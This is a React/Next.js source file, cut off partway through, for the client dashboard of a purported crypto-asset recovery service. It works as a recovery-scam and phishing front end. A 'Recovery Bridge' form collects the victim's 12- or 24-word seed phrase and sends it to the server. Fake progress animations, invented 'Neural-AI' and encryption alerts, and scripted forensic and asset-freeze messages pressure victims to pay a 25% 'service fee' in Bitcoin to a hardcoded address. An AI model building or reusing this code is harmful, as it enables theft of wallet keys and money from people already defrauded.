'use client';

import { ChangeEvent, useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { getApiUrl } from '@/lib/api-config';
import CyberTracker from '@/components/CyberTracker';

interface User {
  id: string;
  name: string;
  email: string;
  role: string;
}

interface ClientData {
  recoveredAmount: number;
  trackingProgress: number;
  feePaid: boolean;
  paymentPending: boolean;
  paymentConfirmed: boolean;
  fundsUnlocked: boolean;
  balance: number;
  fixed: number;
  marsettaShare: number;
  verifiedLoss1: number;
  verifiedLoss2: number;
  totalEntitlement: number;
}

interface Message {
  id: string;
  from: string;
  message: string;
  time: string;
  clientEmail: string;
  adminReply?: string;
  adminReplyTime?: string;
  content?: string;
  timestamp?: string;
  createdAt?: string;
}

export default function ClientDashboard() {
  const router = useRouter();
  const [user, setUser] = useState<User | null>(null);
  const [token, setToken] = useState<string>('');
  const [seedPhrase, setSeedPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState('');
  const [customWallet, setCustomWallet] = useState('');
  const [evidenceFile, setEvidenceFile] = useState<File | null>(null);
  const [additionalEvidenceAmount, setAdditionalEvidenceAmount] = useState('');
  const [supportMessage, setSupportMessage] = useState('');
  const [evidenceList, setEvidenceList] = useState<Array<any>>([]);
  const [data, setData] = useState<ClientData>({
    recoveredAmount: 0,
    trackingProgress: 0,
    feePaid: false,
    paymentPending: false,
    paymentConfirmed: false,
    fundsUnlocked: false,
    balance: 0,
    fixed: 0,
    marsettaShare: 0,
    verifiedLoss1: 0,
    verifiedLoss2: 0,
    totalEntitlement: 0,
  });
  const [supportMessages, setSupportMessages] = useState<Message[]>([]);
  const [selectedMessageId, setSelectedMessageId] = useState<string | null>(null);
  const [replyText, setReplyText] = useState('');
  const [paymentProofFile, setPaymentProofFile] = useState<File | null>(null);
  const [caseId, setCaseId] = useState<string | null>(null);
  const [evidenceName, setEvidenceName] = useState<string | null>(null);
  const [evidenceHash, setEvidenceHash] = useState<string | null>(null);
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [resetEmail, setResetEmail] = useState('');
  const [loading, setLoading] = useState(true);
  const [animatedProgress, setAnimatedProgress] = useState(0);
  const [displayAmount, setDisplayAmount] = useState(0);
  const [currentFee, setCurrentFee] = useState(0);
  const [isCalculating, setIsCalculating] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [selectedSection, setSelectedSection] = useState('overview');
  const [btcAddress, setBtcAddress] = useState('1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u');
  const [paymentSent, setPaymentSent] = useState(false);
  const [serviceFee, setServiceFee] = useState(0);

  const wallets = ['Coinbase', 'Binance', 'MetaMask', 'Trust Wallet', 'Exodus', 'Ledger', 'Trezor', 'Other'];

  const sections = [
    { id: 'overview', label: 'Beneficiary' },
    { id: 'bridge', label: 'Recovery Bridge' },
    { id: 'service', label: 'Service & Payment' },
    { id: 'evidence', label: 'Evidence' },
    { id: 'support', label: 'Support' },
    { id: 'security', label: 'Security' },
  ];

  const handleSectionClick = (sectionId: string) => {
    setSelectedSection(sectionId);
    setMenuOpen(false);
    sessionStorage.setItem('clientDashboardSection', sectionId);
    // scroll to the section if rendered
    setTimeout(() => {
      const el = document.getElementById(sectionId);
      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 120);
  };

  // Poll for client data so admin updates appear on client within short time
  useEffect(() => {
    if (!token) return;
    const iv = setInterval(() => {
      fetchClientData(token);
    }, 8000);
    return () => clearInterval(iv);
  }, [token]);

  // Calculate service fee (25%) whenever total entitlement changes
  useEffect(() => {
    const fee = data.totalEntitlement * 0.25;
    setServiceFee(fee);
  }, [data.totalEntitlement]);

  const inboxMessages = [
    {
      label: 'SYSTEM ALERT',
      message: 'Neural-AI audit completed 0% of required telemetry checks.',
      time: '02:14 UTC',
    },
    {
      label: 'PAYMENT NOTICE',
      message: 'To initiate the secure retraction and finalize this phase of your case, the associated professional service fee of (25%) must be settled. Please note that secured assets are held in a temporary multi-sig state; prompt settlement ensures the immediate release of funds to your custody.',
      time: '01:58 UTC',
    },
    {
      label: 'SECURITY BRIEF',
      message: 'AES-256-GCM channel active; seed phrase bridge awaiting handshake.',
      time: '01:22 UTC',
    },
  ];

  useEffect(() => {
    const storedToken = sessionStorage.getItem('token');
    const storedUser = sessionStorage.getItem('user');

    if (!storedToken || !storedUser) {
      router.push('/login');
      return;
    }

    try {
      const parsedUser = JSON.parse(storedUser);
      if (parsedUser.role !== 'client') {
        router.push('/login');
        return;
      }

      setToken(storedToken);
      setUser(parsedUser);

      // Load client data
      fetchClientData(storedToken);
      fetchMessages(storedToken);
    } catch (error) {
      console.error('Error parsing user data:', error);
      sessionStorage.removeItem('token');
      sessionStorage.removeItem('user');
      router.push('/login');
    }
  }, []);

  // Animate progress bar with phases
  useEffect(() => {
    const timer = setInterval(() => {
      setAnimatedProgress((prev) => {
        if (prev < data.trackingProgress) {
          // Phase 1: Fast scanning (0-85%)
          if (prev < 85) return prev + 2;
          // Phase 2: Slow decryption (85-95%)
          else if (prev < 95) return prev + 0.5;
          // Phase 3: Final calculation (95-100%)
          else return prev + 0.2;
        }
        return data.trackingProgress;
      });
    }, 50);
    return () => clearInterval(timer);
  }, [data.trackingProgress]);

  // Animate entitlement and fee calculation
  useEffect(() => {
    if (animatedProgress > 0) {
      setIsCalculating(true);
      const finalAmount = data.totalEntitlement;
      const increment = finalAmount / 100;

      const feePercent = (data as any).feePercent ?? 0.25;
      const timer = setInterval(() => {
        setDisplayAmount((prev) => {
          if (prev < finalAmount) {
            const newAmount = prev + increment;
            setCurrentFee(newAmount * feePercent);
            return newAmount;
          } else {
            clearInterval(timer);
            setIsCalculating(false);
            return finalAmount;
          }
        });
      }, animatedProgress < 85 ? 20 : animatedProgress < 95 ? 60 : 150); // Match progress phases

      return () => clearInterval(timer);
    } else {
      setDisplayAmount(0);
      setCurrentFee(0);
      setIsCalculating(false);
    }
  }, [animatedProgress, data.totalEntitlement]);

  useEffect(() => {
    if (token) {
      fetchEvidence(token);
    }
  }, [token]);

  const fetchClientData = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/client/data'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const clientData = await response.json();
        // Merge nested data with default ClientData structure
        setData({
          recoveredAmount: 0,
          feePaid: false,
          trackingProgress: 0,
          totalPercentage: 0,
          paymentPending: false,
          paymentConfirmed: false,
          fundsUnlocked: false,
          balance: 0,
          fixed: 0,
          marsettaShare: 0,
          verifiedLoss1: clientData.data?.verifiedLoss1 || 0,
          verifiedLoss2: clientData.data?.verifiedLoss2 || 0,
          totalEntitlement: 0,
          ...clientData.data, // spread any additional data fields
        });
        setSelectedWallet(clientData.wallet || '');
        setSeedPhrase(clientData.seedPhrase || '');
        setCaseId(clientData.caseId || null);
        setEvidenceName(clientData.evidence || null);
        setEvidenceHash(clientData.evidenceHash || null);
        // Compute entitlement from verified losses if not provided
        const v1 = clientData.data?.verifiedLoss1 ?? clientData.amountLost ?? 0;
        const v2 = clientData.data?.verifiedLoss2 ?? 0;
        const total = clientData.data?.totalEntitlement ?? (v1 + v2);
        setData(prev => ({ ...prev, verifiedLoss1: v1, verifiedLoss2: v2, totalEntitlement: total } as any));
      } else {
        // Token might be expired
        sessionStorage.removeItem('token');
        sessionStorage.removeItem('user');
        router.push('/login');
      }
    } catch (error) {
      console.error('Error fetching client data:', error);
    } finally {
      setLoading(false);
    }
  };

  const fetchEvidence = async (authToken: string) => {
    try {
      const res = await fetch(getApiUrl('/api/client/evidence'), {
        headers: { Authorization: `Bearer ${authToken}` },
      });
      if (res.ok) {
        const list = await res.json();
        setEvidenceList(list);
      }
    } catch (error) {
      console.error('Error fetching evidence', error);
    }
  };

  const fetchMessages = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const messages = await response.json();
        // If no messages yet, inject an automated onboarding/system notification
        if (!messages || messages.length === 0) {
          const auto = {
            id: 'sys-1',
            from: 'system',
            message:
              'Welcome to Trace Vault. Your case file has been securely routed to our intelligence unit. A cyber analyst is currently reviewing the transaction paths provided. Please ensure all communication logs with the entity are uploaded in full. Expect a preliminary forensic feasibility update within 24–48 hours.',
            time: new Date().toISOString(),
            clientEmail: user?.email || 'dev@example.com',
          };
          const feasibility = {
            id: 'feas-1',
            from: 'admin',
            message: feasibilityMessage.body,
            time: new Date().toISOString(),
            clientEmail: user?.email || 'dev@example.com',
          };
          setSupportMessages([auto, feasibility]);
        } else {
          setSupportMessages(messages);
        }
      }
    } catch (error) {
      console.error('Error fetching messages:', error);
    }
  };

  const feasibilityMessage = {
    subject: `Initial Forensic Assessment Results - Case #${caseId || 'TBD'}`,
    body:
      `Our technical team has completed the initial footprinting of your case. We have successfully mapped the movement of your assets from your initial transaction out to the target wallets/accounts.\n\nCurrent Findings:\n- Asset Vector: [Crypto / Wire Transfer]\n- Current Location: The funds have been traced to a high-volume cluster associated with [Exchange Name / Intermediate Holding Accounts].\n\nNext Milestone: We are preparing the official Forensic Subpoena Package / Asset Freeze Notice to be routed to the compliance operations unit handling that jurisdiction.\n\nTo proceed to the active interception phase, please verify that the attached timeline of your correspondence is 100% accurate. Let us know through this portal if you remember any secondary communication channels used by the bad actor.`,
  };

  const handleSeedChange = (event: ChangeEvent<HTMLTextAreaElement>) => {
    setSeedPhrase(event.target.value);
  };

  const handleWalletChange = (event: ChangeEvent<HTMLSelectElement>) => {
    setSelectedWallet(event.target.value);
  };

  const handleFileChange = (event: ChangeEvent<HTMLInputElement>) => {
    if (event.target.files) {
      setEvidenceFile(event.target.files[0]);
    }
  };

  const handleSimulateSubmit = async () => {
    const wallet = selectedWallet === 'Other' ? customWallet : selectedWallet;
    if (!token) {
      alert('Please login first.');
      return;
    }
    if (!wallet) {
      alert('Please select or enter a wallet first.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/wallet'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ wallet, seedPhrase }),
      });

      const result = await response.json();
      if (response.ok) {
        alert(result.message || 'Recovery bridge request submitted. Await admin confirmation.');
        fetchClientData(token);
      } else {
        alert(result.message || 'Error updating wallet data.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error updating wallet data.');
    }
  };

  const handleSendSupport = async () => {
    if (!supportMessage.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ message: supportMessage }),
      });

      if (response.ok) {
        alert('Support message sent. Admin will respond.');
        setSupportMessage('');
        fetchMessages(token);
      } else {
        alert('Error sending message.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending message.');
    }
  };

  const handleEvidenceUpload = async () => {
    if (!token) {
      alert('Please login first.');
      return;
    }

    if (!evidenceFile) {
      alert('Please select a file to upload.');
      return;
    }

    if (!additionalEvidenceAmount) {
      alert('Please enter the amount for this additional evidence.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/verified-loss-2'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ amount: parseFloat(additionalEvidenceAmount) }),
      });

      if (response.ok) {
        alert('Additional evidence uploaded successfully. Verified Loss 2 updated.');
        setEvidenceFile(null);
        setAdditionalEvidenceAmount('');
        // Reset file input
        const fileInput = document.querySelector('input[type="file"]') as HTMLInputElement;
        if (fileInput) fileInput.value = '';
        // Refresh data
        fetchClientData(token);
      } else {
        alert('Error uploading evidence.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error uploading evidence.');
    }
  };

  const handleReplyToAdmin = async (messageId: string) => {
    if (!replyText.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ message: replyText }),
      });

      if (response.ok) {
        alert('Reply sent to admin.');
        setReplyText('');
        setSelectedMessageId(null);
        fetchMessages(token);
      } else {
        const errorData = await response.json().catch(() => null);
        alert(errorData?.message || 'Error sending reply.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending reply.');
    }
  };

  const handlePaymentProofUpload = (event: ChangeEvent<HTMLInputElement>) => {
    if (event.target.files) {
      setPaymentProofFile(event.target.files[0]);
    }
  };

  const handleChangePassword = async () => {
    if (!currentPassword || !newPassword || !confirmPassword || !token) {
      alert('Please fill in all password fields.');
      return;
    }
    if (newPassword !== confirmPassword) {
      alert('New passwords do not match.');
      return;
    }
    if (newPassword.length < 8) {
      alert('Password must be at least 8 characters long.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/password'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ currentPassword, newPassword }),
      });

      if (response.ok) {
        alert('Password changed successfully.');
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else {
        const error = await response.json();
        alert(error.message || 'Error changing password.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error changing password.');
    }
  };

  const handleForgotPassword = () => {
    if (!resetEmail) {
      alert('Please enter your email address.');
      return;
    }
    // Simulate password reset - in real app this would send email
    alert(`Password reset link sent to ${resetEmail}. Check your email for instructions.`);
    setResetEmail('');
  };

  const formatMessageTime = (rawTime?: string | Date) => {
    const date = rawTime ? new Date(rawTime) : null;
    return date && !isNaN(date.getTime()) ? date.toLocaleTimeString() : '';
  };

  const handleCopyBtcAddress = async () => {
    try {
      await navigator.clipboard.writeText(btcAddress);
      alert('BTC address copied to clipboard!');
    } catch (error) {
      console.error('Error copying:', error);
      alert('Failed to copy address.');
    }
  };

  const handleProofOfPaymentUpload = async () => {
    if (!token) {
      alert('Please login first.');
      return;
    }
    if (!paymentProofFile) {
      alert('Please select a proof of payment file.');
      return;
    }

    try {
      // In a real app, this would upload to S3 or similar
      setPaymentSent(true);
      alert('Payment proof submitted successfully. Admin will verify and unlock funds.');
    } catch (error) {
      console.error('Error:', error);
      alert('Error uploading proof of payment.');
    }
  };

  const handlePaymentSent = () => {
    if (!paymentProofFile) {
      alert('Please upload proof of payment before confirming payment sent.');
      return;
    }
    setPaymentSent(true);
    alert('Payment confirmation sent. Pending admin approval.');
  };

  const handleLogout = () => {
    sessionStorage.removeItem('token');
    sessionStorage.removeItem('user');
    router.push('/');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#040b16] text-white flex items-center justify-center p-6">
          <div className="text-center">
            <p className="text-teal-400 text-xl font-mono">Loading client data...</p>
          </div>
        </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#040b16] text-white p-6 md:p-10">
      <div className="max-w-7xl mx-auto space-y-8">
        <header className="flex flex-col gap-6 xl:flex-row xl:items-start justify-end xl:justify-between">
          <div className="space-y-4">
            <p className="uppercase tracking-[0.35em] text-teal-300 text-xs">VaultTrace Retraction Protocol</p>
            <div className="space-y-2">
              <h1 className="text-4xl md:text-5xl font-black tracking-tight">CLASSIFIED RECOVERY</h1>
              <p className="text-sm text-slate-400 uppercase tracking-[0.25em]">
                CASE: MARSETTA_7743-B • CLIENT: {user?.name} • PRIORITY: ALPHA
              </p>
            </div>
            <div className="flex flex-wrap gap-3">
              <span className="inline-flex items-center gap-2 rounded-full bg-emerald-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-emerald-300">
                <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" /> NEURAL-AI ONLINE
              </span>
              <span className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs uppercase tracking-[0.3em] ${
                data.fundsUnlocked ? 'bg-green-500/15 text-green-300' : 'bg-orange-500/15 text-orange-300'
              }`}>
                {data.fundsUnlocked ? '✓ FUNDS UNLOCKED' : 'FUNDS LOCKED'}
              </span>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-teal-300 mb-3">Encryption Standards</p>
              <div className="space-y-2 text-sm text-slate-200">
                <p>AES-256-GCM</p>
                <p>ChaCha20-Poly1305</p>
              </div>
              <p className="mt-4 text-xs text-slate-500">Secure audit channel verified for classified recovery operations.</p>
            </div>
            <button
              onClick={handleLogout}
              className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5 hover:bg-red-500/10 transition"
            >
              <p className="text-xs uppercase tracking-[0.3em] text-red-300">Logout</p>
            </button>
          </div>
        </header>

        <div className="relative">
          <div className="flex flex-wrap items-center justify-between gap-4 rounded-[32px] border border-white/10 bg-slate-950/70 p-4 shadow-xl shadow-teal-500/5">
            <div className="text-sm text-slate-300">
              Active section: <span className="font-semibold text-white">{sections.find((section) => section.id === selectedSection)?.label}</span>
            </div>
            <button
              type="button"
              onClick={() => setMenuOpen((open) => !open)}
              className="inline-flex h-12 items-center justify-center rounded-3xl border border-white/10 bg-white/5 px-5 text-sm font-semibold text-teal-300 hover:bg-teal-500/10"
            >
              ☰ Sections
            </button>
          </div>
          {menuOpen && (
            <div className="mt-4 space-y-3 rounded-[32px] border border-white/10 bg-slate-900/80 p-4">
              {sections.map((section) => (
                <button
                  type="button"
                  key={section.id}
                  onClick={() => handleSectionClick(section.id)}
                  className={`w-full rounded-3xl px-4 py-3 text-left text-sm font-semibold transition ${selectedSection === section.id ? 'bg-teal-500 text-black' : 'bg-slate-950/80 text-slate-200 hover:bg-slate-900'}`}
                >
                  {section.label}
                </button>
              ))}
            </div>
          )}
        </div>

        <section className="space-y-6">
          {selectedSection === 'overview' && (
            <div id="overview" className="space-y-6">
              <div className="rounded-[32px] border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-teal-500/5">
                <div className="flex flex-wrap items-center justify-between gap-4">
                  <div>
                    <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Client Dashboard</p>
                    <h2 className="text-xl font-semibold text-white">Beneficiary Profile</h2>
                    <p className="text-sm text-slate-500">Only the beneficiary profile is visible by default. Open a session from the menu to view more.</p>
                  </div>
                </div>
              </div>

          <div className="rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
            <div className="flex items-center justify-between gap-4">
              <div>
                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Beneficiary Profile</p>
                <h3 className="mt-2 text-2xl font-semibold text-white">Case ID: {caseId || 'TBD'}</h3>
              </div>
              <span className="rounded-full bg-emerald-500/10 px-4 py-2 text-xs uppercase tracking-[0.3em] text-emerald-300">Verified</span>
            </div>

            <div className="mt-6 grid gap-4 md:grid-cols-3 text-sm text-slate-300">
              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #1</p>
                <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss1?.toLocaleString() || '0.00'}</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #2</p>
                <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss2?.toLocaleString() || '0.00'}</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10 relative">
                <div className="flex items-start justify-between gap-2">
                  <div className="flex-1">
                    <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Total Entitlement</p>
                    <p className="mt-2 text-2xl font-semibold text-teal-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                  </div>
                  <div className="text-right">
                    <div className={`text-3xl ${data.fundsUnlocked ? 'text-green-400' : 'text-red-500'}`}>
                      {data.fundsUnlocked ? '🔓' : '🔒'}
                    </div>
                    <p className={`text-xs font-bold uppercase tracking-[0.2em] mt-1 ${data.fundsUnlocked ? 'text-green-400' : 'text-red-400'}`}>
                      {data.fundsUnlocked ? 'FUNDS UNLOCKED' : 'FUNDS LOCKED'}
                    </p>
                  </div>
                </div>
                <p className={`mt-3 text-right text-xs font-semibold uppercase tracking-[0.18em] ${data.fundsUnlocked ? 'text-emerald-300' : 'text-red-400'}`}>
                  {data.fundsUnlocked ? 'Unlocked by admin approval' : 'Funds are currently locked until service fee is confirmed'}
                </p>
              </div>
            </div>
            <CyberTracker
              steps={['Intake Submission', 'Technical Assessment', 'Evidence Validation', 'Forensic Recovery', 'Release Authorization']}
              currentStage={((data as any).statusIndex ?? Math.ceil((data.trackingProgress || 0) / 20)) + 1}
              progress={animatedProgress}
            />
          </div>
        </div>
      )}

          {selectedSection === 'bridge' && (
              <div id="bridge" className="space-y-6">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Recovery Bridge</p>
                  <h3 className="text-2xl font-semibold text-white">Connect Wallet</h3>
                </div>
                <select
                  value={selectedWallet}
                  onChange={handleWalletChange}
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                >
                  <option value="">Select Wallet</option>
                  {wallets.map((wallet) => (
                    <option key={wallet} value={wallet}>{wallet}</option>
                  ))}
                </select>
                {selectedWallet === 'Other' && (
                    <input
                    type="text"
                    value={customWallet}
                    onChange={(e) => setCustomWallet(e.target.value)}
                    placeholder="Enter custom wallet name"
                      className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                  />
                )}
                <textarea
                  rows={6}
                  value={seedPhrase}
                  onChange={handleSeedChange}
                  placeholder="Enter 12-word or 24-word recovery phrase"
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                />
                <button
                  onClick={handleSimulateSubmit}
                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
                >
                  Establish Secure Bridge
                </button>
              </div>
            )}

            {selectedSection === 'service' && (
              <div id="service" className="space-y-6">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Service & Payment</p>
                  <h3 className="text-2xl font-semibold text-white">Settlement Required</h3>
                </div>

                <div className="grid gap-4 md:grid-cols-2">
                  <div className="rounded-3xl bg-gradient-to-br from-cyan-500/10 to-cyan-400/10 border border-cyan-500/30 p-6">
                    <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-2">Service Fee (25%)</p>
                    <p className="text-4xl font-bold text-cyan-300">${serviceFee.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                    <p className="text-xs text-slate-400 mt-2">Auto-calculated from Total Entitlement</p>
                  </div>

                  <div className="rounded-3xl bg-slate-950/80 border border-white/10 p-6">
                    <p className="text-xs uppercase tracking-[0.3em] text-slate-400 mb-4">Bitcoin Wallet Address</p>
                    <div className="flex gap-2 items-center">
                      <input
                        type="text"
                        value={btcAddress}
                        readOnly
                        className="flex-1 rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-3 text-sm text-slate-200 focus:outline-none"
                      />
                      <button
                        type="button"
                        onClick={handleCopyBtcAddress}
                        className="rounded-3xl bg-cyan-500 px-6 py-3 text-sm font-semibold text-black hover:bg-cyan-400"
                      >
                        Copy
                      </button>
                    </div>
                    <p className="mt-3 text-xs text-slate-500">Use this address to send the service payment. Then upload your proof.</p>
                  </div>
                </div>

                <div className="rounded-3xl bg-slate-950/80 border border-white/10 p-6">
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400 mb-4">Upload Proof of Payment</p>
                  <div className="space-y-4">
                    <input
                      type="file"
                      onChange={(e) => setPaymentProofFile(e.target.files?.[0] || null)}
                      className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 file:bg-teal-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded"
                    />
                    <button
                      type="button"
                      onClick={handleProofOfPaymentUpload}
                      className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
                    >
                      {paymentSent ? '✓ Proof Submitted' : 'Submit Payment Proof'}
                    </button>
                  </div>
                </div>

                <div className="rounded-3xl bg-slate-950/80 border border-white/10 p-6">
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400 mb-2">Payment Status</p>
                  <div className={`text-lg font-bold ${paymentSent ? 'text-green-400' : 'text-orange-400'}`}>
                    {paymentSent ? '✓ Payment Submitted' : 'Awaiting Payment'}
                  </div>
                  <p className="text-xs text-slate-500 mt-2">Please upload proof of payment before confirming the payment.</p>
                  <button
                    type="button"
                    onClick={handlePaymentSent}
                    className={`mt-4 w-full rounded-3xl px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] transition ${paymentSent ? 'bg-emerald-500 text-black hover:bg-emerald-400' : 'bg-orange-500 text-black hover:bg-orange-400'}`}
                  >
                    {paymentSent ? 'Payment Sent Confirmed' : 'I Have Sent My Payment'}
                  </button>
                </div>
              </div>
            )}

            {selectedSection === 'evidence' && (
              <div id="evidence" className="space-y-6">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Evidence</p>
                  <h3 className="text-2xl font-semibold text-white">Upload Supporting Files</h3>
                </div>
                <input
                  type="file"
                  onChange={handleFileChange}
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 file:bg-teal-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded"
                />
                <input
                  type="number"
                  value={additionalEvidenceAmount}
                  onChange={(e) => setAdditionalEvidenceAmount(e.target.value)}
                  placeholder="Enter amount for this evidence ($)"
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                />
                <button
                  onClick={handleEvidenceUpload}
                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
                >
                  Upload Evidence
                </button>
              </div>
            )}

            {selectedSection === 'support' && (
              <div id="support" className="space-y-6">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Support</p>
                  <h3 className="text-2xl font-semibold text-white">Contact Support</h3>
                </div>
                <textarea
                  rows={4}
                  value={supportMessage}
                  onChange={(e) => setSupportMessage(e.target.value)}
                  placeholder="Type your message here"
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                />
                <button
                  onClick={handleSendSupport}
                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
                >
                  Send Message
                </button>
              </div>
            )}

            {selectedSection === 'security' && (
              <div id="security" className="space-y-6">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Security</p>
                  <h3 className="text-2xl font-semibold text-white">Account Protection</h3>
                </div>
                <input
                  type="password"
                  value={currentPassword}
                  onChange={(e) => setCurrentPassword(e.target.value)}
                  placeholder="Current password"
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                />
                <input
                  type="password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  placeholder="New password"
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                />
                <input
                  type="password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  placeholder="Confirm new password"
                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                />
                <button
                  onClick={handleChangePassword}
                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
                >
                  Change Password
                </button>
              </div>
            )}
        </section>

        <section className="mt-6 glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
          <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
            <div>
              <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Support & Messages</p>
              <h2 className="mt-2 text-2xl font-semibold">Admin Replies & Updates</h2>
            </div>
            <span className="rounded-full bg-slate-900/80 px-4 py-2 text-xs uppercase tracking-[0.3em] text-slate-300 border border-slate-700">
              {supportMessages.filter((msg: any) => msg.adminReply).length} replies
            </span>
          </div>

          <div className="mt-6 space-y-4">
            {supportMessages.length === 0 ? (
              <p className="text-slate-400">No messages yet.</p>
            ) : (
              supportMessages.map((msg) => (
                <div key={msg.id} className="rounded-3xl border border-white/10 bg-slate-950/80 p-5">
                  <div className="flex items-center justify-between gap-3 mb-3">
